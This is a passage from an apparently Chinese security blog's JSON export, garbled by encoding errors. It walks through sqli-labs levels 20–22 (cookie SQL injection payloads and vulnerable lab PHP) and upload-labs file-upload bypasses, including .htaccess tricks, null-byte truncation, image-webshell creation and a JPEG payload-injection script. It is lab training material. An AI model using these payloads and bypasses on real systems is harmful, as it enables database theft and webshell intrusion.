src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125;&#125;?&gt; Less-20è¿™ä¸ªå°±æ˜¯Cookieæ³¨å…¥äº†ï¼Œsqlè¯­å¥ï¼š 1SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1 å…ˆç™»é™†è¿›å»å‘ç°Cookieå­—æ®µå¢åŠ äº†uname,ç›´æ¥è”åˆæŸ¥è¯¢ 1Cookie: uname=adsadas&#x27; union select 1,2,database()%23 æŠ¥é”™æ³¨å…¥ï¼š 1Cookie: uname=asddasd&#x27; or updatexml(1,concat(0x3a,(select user())),1)%23 æ—¶é—´ç›²æ³¨ï¼š 1Cookie: uname=adsadas&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0)%23 å¸ƒå°”ç›²æ³¨ï¼š 1Cookie: uname=adsadas&#x27; or substr((select database()),1,1)=&#x27;s&#x27;%23 å…³é”®ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);if(!isset($_COOKIE[&#x27;uname&#x27;]))&#123; //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); function check_input($value) &#123; if(!empty($value)) &#123; $value = substr($value,0,20); // truncation (see comments) &#125; if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) // Quote if not a number &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $uname = check_input($_POST[&#x27;uname&#x27;]); $passwd = check_input($_POST[&#x27;passwd&#x27;]); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); $cookee = $row1[&#x27;username&#x27;]; if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; setcookie(&#x27;uname&#x27;, $cookee, time()+3600); header (&#x27;Location: index.php&#x27;); echo &quot;I LOVE YOU COOKIES&quot;; echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; &#125;&#125;else&#123; if(!isset($_POST[&#x27;submit&#x27;])) &#123; $cookee = $_COOKIE[&#x27;uname&#x27;]; $format = &#x27;D d M Y - H:i:s&#x27;; $timestamp = time() + 3600; echo &quot;&lt;center&gt;&quot;; echo &#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;; echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;; echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;; echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp); echo &quot;&lt;br&gt;&lt;/font&gt;&quot;; $sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your ID:&#x27; .$row[&#x27;id&#x27;]; &#125; else &#123; echo &quot;&lt;center&gt;&quot;; echo &#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;; echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; &#125; echo &#x27;&lt;center&gt;&#x27;; echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;; echo &#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;; echo &#x27;&lt;/form&gt;&#x27;; echo &#x27;&lt;/center&gt;&#x27;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;; echo &quot; Your Cookie is deleted&quot;; setcookie(&#x27;uname&#x27;, $row1[&#x27;username&#x27;], time()-3600); header (&#x27;Location: index.php&#x27;); echo &#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;; &#125;fwrite($fp,&#x27;Cookie:&#x27;.$cookee.&quot;\\n&quot;);fclose($fp);&#125;?&gt; Less-21è¿™ä¸ªå’Œä¸Šé¢çš„æ²¡å•¥å·®åˆ«ï¼Œåªä¸è¿‡å°†uname base64åŠ å¯†äº† å…³é”®ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);if(!isset($_COOKIE[&#x27;uname&#x27;]))&#123; //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); function check_input($value) &#123; if(!empty($value)) &#123; $value = substr($value,0,20); // truncation (see comments) &#125; if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) // Quote if not a number &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $uname = check_input($_POST[&#x27;uname&#x27;]); $passwd = check_input($_POST[&#x27;passwd&#x27;]); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600); echo &quot;I LOVE YOU COOKIES&quot;; echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; //echo &#x27;Your Cookie is: &#x27; .$cookee; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; header (&#x27;Location: index.php&#x27;); &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; &#125;&#125;else&#123; if(!isset($_POST[&#x27;submit&#x27;])) &#123; $cookee = $_COOKIE[&#x27;uname&#x27;]; $format = &#x27;D d M Y - H:i:s&#x27;; $timestamp = time() + 3600; echo &quot;&lt;center&gt;&quot;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;; echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;; echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp); $cookee = base64_decode($cookee); echo &quot;&lt;br&gt;&lt;/font&gt;&quot;; $sql=&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your ID:&#x27; .$row[&#x27;id&#x27;]; &#125; else &#123; echo &quot;&lt;center&gt;&quot;; echo &#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;; echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; //echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;; &#125; echo &#x27;&lt;center&gt;&#x27;; echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;; echo &#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;; echo &#x27;&lt;/form&gt;&#x27;; echo &#x27;&lt;/center&gt;&#x27;; &#125; else &#123; echo &#x27;&lt;center&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;; echo &quot; Your Cookie is deleted&quot;; setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()-3600); header (&#x27;Location: index.php&#x27;); echo &#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;; &#125; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;Cookie:&#x27;.$cookee.&quot;\\n&quot;); fclose($fp);&#125;?&gt; Less-22è¿™ä¸ªé—­åˆæ–¹å¼å˜æˆåŒå¼•å·å°±è¡Œäº†ï¼Œ20å…³çš„å››ç§æ³¨å…¥éƒ½è¡Œ å…³é”®ä»£ç 123$cookee = base64_decode($cookee);$cookee1 = &#x27;&quot;&#x27;. $cookee. &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://www.m00nback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"upload-labsé¶åœºé€šå…³æ‰‹å†Œ","slug":"upload-labs-wp","date":"2019-10-16T14:23:20.000Z","updated":"2019-10-16T14:41:10.817Z","comments":true,"path":"2019/10/16/upload-labs-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/10/16/upload-labs-wp/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†uploadlabsé¶åœºé€šå…³æŒ‡å—ï¼ä¸ºäº†æ–¹ä¾¿æ˜¾ç¤ºï¼Œè¿™é‡ŒæŠŠä¸€å¥è¯å†™æˆphpinfo,å¹¶ä½¿ç”¨bpæŠ“åŒ…!","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†uploadlabsé¶åœºé€šå…³æŒ‡å—ï¼ä¸ºäº†æ–¹ä¾¿æ˜¾ç¤ºï¼Œè¿™é‡ŒæŠŠä¸€å¥è¯å†™æˆphpinfo,å¹¶ä½¿ç”¨bpæŠ“åŒ…! Pass-01è€ƒå¯Ÿç‚¹ï¼šæœ¬åœ°jsæ£€éªŒ é€šå…³æ–¹æ³•ï¼š ä¸Šä¼ webshellæ—¶å°†å…¶åç¼€æ”¹ä¸º.jpgæˆ–.pngæˆ–.gif,å†ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.phpåç¼€ ä¿®æ”¹jsä»£ç ï¼ŒF12ä»£å¼€å¼€å‘äººå‘˜å·¥å…·ï¼Œä¿®æ”¹checkFile()å‡½æ•° Pass-02è€ƒå¯Ÿç‚¹ï¼šMIMEç±»å‹æ£€æµ‹ é€šå…³æ–¹æ³•ï¼š ä¸Šä¼ webshellæ—¶å°†å…¶åç¼€æ”¹ä¸º.jpgæˆ–.pngæˆ–.gif,å†ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.phpåç¼€ Pass-03è€ƒå¯Ÿç‚¹ï¼šç‰¹æ®Šåç¼€åç»•è¿‡ é€šå…³æ–¹æ³•ï¼š å› ä¸ºæ²¡æœ‰jsæ£€æµ‹ï¼Œç›´æ¥ä¸Šä¼ .phtmlåç¼€å°±å¯ä»¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰ä¸ªæ— æ³•æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œå³é”®å¯ä»¥è·å–åˆ°å›¾ç‰‡çš„åœ°å€ å°†å…¶æ³¨é‡Šå–æ¶ˆé‡å¯Apacheå³å¯è§£æ Pass-04è€ƒå¯Ÿç‚¹ï¼š.htaccessç»•è¿‡ é€šå…³æ–¹æ³•ï¼š å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 123&lt;FilesMatch &quot;xxx&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt; å†ä¸Šä¼ ä¸€ä¸ªtest.xxxæ–‡ä»¶(å†™å…¥webshell)ï¼Œtest.xxxå°±å¯ä»¥è¢«è§£ææˆphpä»£ç æ‰§è¡Œ æ³¨æ„ï¼šphpç‰ˆæœ¬é—®é¢˜å¯èƒ½ä¼šå¯¼è‡´è§£æå¤±è´¥ï¼Œäº²æµ‹php5.2.17å®Œç¾è§£æ Pass-05è€ƒå¯Ÿç‚¹ï¼šå¤§å°å†™ç»•è¿‡ é€šå…³æ–¹æ³•ï¼š ä¸Šä¼ ä¸º.Phpåç¼€çš„webshell Pass-06è€ƒå¯Ÿç‚¹ï¼šåç¼€åŠ ç©ºæ ¼ç»•è¿‡ é€šå…³æ–¹æ³•ï¼š ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.phpåç¼€çš„webshell Pass-07è€ƒå¯Ÿç‚¹ï¼šwindowsåŠ .ç»•è¿‡(å¯¹æ–‡ä»¶å‘½åæ—¶æœ€åä¸€ä¸ªå­—ç¬¦ä¸º.ä¼šè‡ªåŠ¨å¿½ç•¥) é€šå…³æ–¹æ³•ï¼š ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.php.åç¼€ Pass-08è€ƒå¯Ÿç‚¹ï¼šwindows::$DATAç»•è¿‡ç»•è¿‡ é€šå…³æ–¹æ³•ï¼š ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.php::$DATAåç¼€ Pass-09è€ƒå¯Ÿç‚¹ï¼šåç¼€åŠ . .ç»•è¿‡ é€šå…³æ–¹æ³•ï¼š ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.php. .åç¼€ Pass-10è€ƒå¯Ÿç‚¹ï¼šåŒå†™ç»•è¿‡ é€šå…³æ–¹æ³•ï¼š ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.pphphpåç¼€ 1234$deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name); å¯ä»¥çœ‹åˆ°æºç ä¸­å°†å¯ä»¥å½“æˆphpè§£æçš„åç¼€éƒ½æ›¿æ¢æˆç©ºäº† æ³¨æ„ï¼šæ–‡ä»¶åä¸­çš„å…³é”®è¯ä¹Ÿä¼šæ›¿æ¢ Pass-11è€ƒå¯Ÿç‚¹ï¼š%00æˆªæ–­ç»•è¿‡ç»•è¿‡ç™½åå• é€šå…³æ–¹æ³•ï¼š ç”¨bpæŠ“åŒ…å°† save_pathä¿å­˜ä¸ºï¼š save_path=../upload/phpinfo.php%00 $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; é€šè¿‡ä»£ç å®¡è®¡å¯ä»¥çœ‹å‡ºæ¥ï¼Œ$_GET[â€˜save_pathâ€™]å¯ä»¥ç”¨%00ç»•è¿‡ Pass-12è€ƒå¯Ÿç‚¹ï¼šäºŒè¿›åˆ¶00æˆªæ–­æ¼æ´ç»•è¿‡ç™½åå• é€šå…³æ–¹æ³•ï¼š ç”¨bpæŠ“åŒ…å°† save_pathä¿å­˜ä¸ºï¼š save_path=../upload/phpinfo.php* *ä»£è¡¨00 å’Œåä¸€å…³ä¸åŒçš„æ˜¯è¿™æ¬¡çš„save_pathæ˜¯é€šè¿‡postä¼ è¿›æ¥çš„ï¼Œè¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œä½†è¿™æ¬¡éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚ Pass-13è€ƒå¯Ÿç‚¹ï¼šå›¾ç‰‡é©¬ é€šå…³æ–¹æ³•ï¼š 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file &#x3D; fopen($filename, &quot;rb&quot;); $bin &#x3D; fread($file, 2); &#x2F;&#x2F;åªè¯»2å­—èŠ‚ fclose($file); $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin); $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType &#x3D; &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType &#x3D; &#39;jpg&#39;; break; case 13780: $fileType &#x3D; &#39;png&#39;; break; case 7173: $fileType &#x3D; &#39;gif&#39;; break; default: $fileType &#x3D; &#39;unknown&#39;; &#125; return $fileType;&#125; ç”±æºç å¯çŸ¥ï¼Œæ˜¯é€šè¿‡æ£€æµ‹æ–‡ä»¶å¤´(ä¸¤ä¸ªå­—èŠ‚)æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹çš„ é€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ï¼Œåˆ¶ä½œæ–¹æ³•ï¼šcmdä¸‹ 1copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½¿ç”¨æ–‡ä»¶åŒ…å«åŒ…å«ä¸Šä¼ çš„å›¾ç‰‡é©¬ æˆ–è€…åœ¨webshellå‰é¢ä¸€è¡ŒåŠ ä¸ŠGIF89a,å¹¶å‘½åä¸º.gifåç¼€æ–‡ä»¶ï¼Œå³å¯ç”Ÿæˆgifç±»å‹çš„å›¾ç‰‡é©¬ Pass-14è€ƒå¯Ÿç‚¹ï¼šå›¾ç‰‡é©¬ é€šå…³æ–¹æ³•ï¼š æºç getimagesize()å‡½æ•°è·å–æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ getimagesize()å‡½æ•°æ˜¯é€šè¿‡è¯†åˆ«æ–‡ä»¶å¤´æ¥åˆ¤åˆ«æ˜¯å¦æ˜¯å›¾ç‰‡æ–‡ä»¶çš„ Pass-15è€ƒå¯Ÿç‚¹ï¼šå›¾ç‰‡é©¬ é€šå…³æ–¹æ³•ï¼š è¿™é‡Œç”¨åˆ°php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ Pass-16è€ƒå¯Ÿç‚¹ï¼šå›¾ç‰‡é©¬+content-type+äºŒæ¬¡æ¸²æŸ“ é€šå…³æ–¹æ³•ï¼š æœ¬å…³ç»¼åˆåˆ¤æ–­äº†åç¼€åã€content-typeï¼Œä»¥åŠåˆ©ç”¨imagecreatefromgifåˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“ ä»€ä¹ˆæ˜¯äºŒæ¬¡æ¸²æŸ“å‘¢ï¼ŸäºŒæ¬¡æ¸²æŸ“å°±æ˜¯è°ƒç”¨APIï¼Œä¾‹å¦‚phpçš„GDåº“ï¼Œé‡æ–°ç”Ÿæˆä¸€å¼ å›¾ç‰‡ï¼Œåœ¨ç”Ÿæˆçš„è¿‡ç¨‹ä¸­ï¼ŒæŠŠåŸæœ¬å±äºå›¾åƒæ•°æ®çš„éƒ¨åˆ†æŠ“äº†å‡ºæ¥ï¼Œå†ç”¨è‡ªå·±çš„API æˆ–å‡½æ•°è¿›è¡Œé‡æ–°æ¸²æŸ“ å¯¹æ¸²æŸ“/åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼æ˜¯ä»£ç æ³¨å…¥ç»•è¿‡ å¯¹äºŒæ¬¡æ¸²æŸ“æ”»å‡»æ–¹å¼æ˜¯æ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº« å…³äºç»•è¿‡äºŒæ¬¡æ¸²æŸ“,æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°†phpä»£ç å†™è¿›å»,å°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº† å°†ä¸Šä¼ çš„å›¾ç‰‡ä¸‹è½½åˆ°æœ¬åœ°ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨å°†å…¶æ‰“å¼€ï¼Œå‘ç°å…¶å†…å®¹å·²ç»æ”¹å˜ ä¸Šä¼ gifä¸Šä¼ pngä¸Šä¼ jpgè¿™é‡Œä¹Ÿé‡‡ç”¨å›½å¤–å¤§ç‰›ç¼–å†™çš„è„šæœ¬jpg_payload.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php&#x2F;*The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().It is necessary that the size and quality of the initial image are the same as those of the processed image.1) Upload an arbitrary image via secured files upload script2) Save the processed image and launch:jpg_payload.php &lt;jpg_name.jpg&gt;In case of successful injection you will get a specially crafted image, which should be uploaded again.Since the most straightforward injection method is used, the following problems can occur:1) After the second processing the injected data may become partially corrupted.2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.Sergey Bobrov @Black2Fan.See also:https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;*&#x2F;$miniPayload &#x3D; &quot;&lt;?&#x3D;phpinfo();?&gt;&quot;;if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123; die(&#39;php-gd is not installed&#39;);&#125;if(!isset($argv[1])) &#123; die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);&#125;set_error_handler(&quot;custom_error_handler&quot;);for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize &#x3D; $pad; $dis &#x3D; new DataInputStream($argv[1]); $outStream &#x3D; file_get_contents($argv[1]); $extraBytes &#x3D; 0; $correctImage &#x3D; TRUE; if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123; die(&#39;Incorrect SOI marker&#39;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123; $marker &#x3D; $dis-&gt;readByte(); $size &#x3D; $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123; $startPos &#x3D; $dis-&gt;seek(); $outStreamTmp &#x3D; substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !&#x3D;&#x3D; 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123; if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123; break; &#125; &#125; &#125; $stopPos &#x3D; $dis-&gt;seek() - 2; $imageStreamSize &#x3D; $stopPos - $startPos; $outStream &#x3D; substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream &#x3D; $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123; die(&#39;Success!&#39;); &#125; else &#123; break; &#125; &#125; &#125;&#125;unlink(&#39;payload_&#39;.$argv[1]);die(&#39;Something\\&#39;s 